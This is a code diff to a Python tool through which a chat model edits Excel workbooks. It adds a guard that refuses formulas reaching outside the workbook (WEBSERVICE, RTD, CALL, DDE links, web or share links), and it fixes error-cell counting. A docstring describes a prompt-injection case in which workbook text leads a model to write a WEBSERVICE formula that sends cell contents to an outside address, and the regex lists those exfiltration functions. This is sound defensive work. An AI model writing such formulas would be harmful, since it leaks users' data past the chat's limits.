@@ -166,6 +166,39 @@ def sheet_name_problem(name: Any) -> str:
     return ""
 
 
+_OUTSIDE_FUNCS = re.compile(r"(?i)(?<![A-Za-z0-9_.])(WEBSERVICE|RTD|IMAGE|CALL|REGISTER\.ID|SQL\.REQUEST)\s*\(")
+
+
+def reaches_out(text: Any) -> str:
+    """Why a cell entry would make Excel reach OUTSIDE the workbook, or "".
+
+    A workbook's text is someone else's words, and a model that follows them
+    could be told to write =WEBSERVICE("https://...?d="&A1): Excel itself then
+    sends the cell to that address, whatever the chat's own limits are. The
+    same for a live link to a web address or a network share, a DDE link
+    (=cmd|...) and a call into a library. Such an entry is typed by the user,
+    never written from chat. Pure, linear."""
+    s = str(text or "")
+    if s[:1] not in ("=", "+", "-", "@"):
+        return ""
+    bare = re.sub(r'"[^"]*"', '""', s)  # what is inside quotes is text, not a call
+    m = _OUTSIDE_FUNCS.search(bare)
+    if m:
+        return f"{m.group(1).upper()}() makes Excel call outside the workbook"
+    if re.search(r"[A-Za-z0-9_.]\|", bare):  # =program|topic!item
+        return "a link to another program (DDE) runs that program"
+    if "://" in bare or "\\\\" in bare:
+        return "it links to a web address or a network share"
+    return ""
+
+
+def _stays_inside(*entries: Any) -> None:
+    for e in entries:
+        why = reaches_out(e) if isinstance(e, str) else ""
+        if why:
+            raise Refusal(f"that formula is not written from chat: {why}. The user can type it in Excel themselves", "reaches_out")
+
+
 def copy_name(workbook_name: str) -> str:
     """The file name for a copy of an open workbook. ``SaveCopyAs`` writes the
     workbook's OWN format, so the copy keeps the workbook's own ending (a
@@ -488,7 +521,13 @@ def _calc_words(app: Any) -> str:
         return "automatic"
 
 
-def _error_cells(ws: Any, limit: int = 40) -> "list[str]":
+#: How many error cells of a sheet are read before and after a change. With
+#: 40, a sheet that already had more showed its 41st OLD error as "new" the
+#: moment a change fixed one (the review).
+ERROR_CELLS_READ = 400
+
+
+def _error_cells(ws: Any, limit: int = ERROR_CELLS_READ) -> "list[str]":
     """Addresses of formula cells on *ws* that show an error (bounded)."""
     try:
         cells = ws.UsedRange.SpecialCells(-4123, 16)
@@ -952,6 +991,7 @@ def h_set(cx: Cx, op: dict) -> dict:
             single = single if single.startswith("=") else "=" + single
         else:
             single = to_cell_text(op.get("value"))
+    _stays_inside(single, *(v for r in (new or []) for v in r))
     before_f = _formulas(rng, rows, cols) if has_value else []
     if has_value:
         probe = new if new is not None else (None if rows * cols > 1 and isinstance(single, str) and single.startswith("=") else [[single] * cols for _ in range(rows)])
@@ -1430,6 +1470,9 @@ def h_conditional_format(cx: Cx, op: dict) -> dict:
     known = set(_CF_OPS) | {"formula", "text_contains", "duplicates", "top", "bottom", "data_bar", "color_scale"}
     if rule not in known:
         raise Refusal(f"rule is one of: {', '.join(sorted(known))}", "bad_step")
+    f = op.get("formula")
+    _stays_inside(f if not isinstance(f, str) or f[:1] in "=+-@" else "=" + f,
+                  *(str(op[k]) for k in ("value", "value2") if op.get(k) is not None))
     info = {"op": "conditional_format", "where": f"{ws.Name}!{a1(*box)}",
             "summary": f"add a colour rule ({rule.replace('_', ' ')}) to {ws.Name}!{a1(*box)}"}
     if cx.planning:
@@ -1553,6 +1596,7 @@ def h_validation(cx: Cx, op: dict) -> dict:
         else:
             new = {"type": _VAL_TYPES[kind], "alert": 1, "operator": 8, "f1": str(hi), "f2": ""}
         words = f"a {kind} number rule" if kind != "date" else "a date rule"
+    _stays_inside(new["f1"], new["f2"])
     new["error"] = str(op.get("message") or "")
     new["input"] = str(op.get("prompt") or "")
     info = {"op": "validation", "where": f"{ws.Name}!{a1(*box)}", "summary": f"add {words} to {ws.Name}!{a1(*box)}"}
@@ -1905,6 +1949,7 @@ def h_name(cx: Cx, op: dict) -> dict:
         raise Refusal(f"'{name}' cannot be a name (letters, digits, _ and . only; it cannot look like a cell)", "bad_step")
     ref = str(_need(op, "refers_to")).strip()
     ref = ref if ref.startswith("=") else "=" + ref
+    _stays_inside(ref)
     info = {"op": "name", "where": name, "summary": f"name {ref[1:]} as '{name}'"}
     if cx.planning:
         return info
@@ -2169,8 +2214,11 @@ def op_apply(req: dict) -> dict:
     new_errors: list[str] = []
     for ws in wb.Worksheets:
         name = str(ws.Name)
+        was = before_errors.get(name, set())
+        if len(was) >= ERROR_CELLS_READ:
+            continue  # more errors than were read before: "new" cannot be told from "not read"
         for cell in _error_cells(ws):
-            if cell not in before_errors.get(name, set()) and len(new_errors) < 20:
+            if cell not in was and len(new_errors) < 20:
                 new_errors.append(f"{name}!{cell}")
     return {
         "ok": True, "workbook": str(wb.Name), "path": str(wb.FullName), "steps": cx.steps,
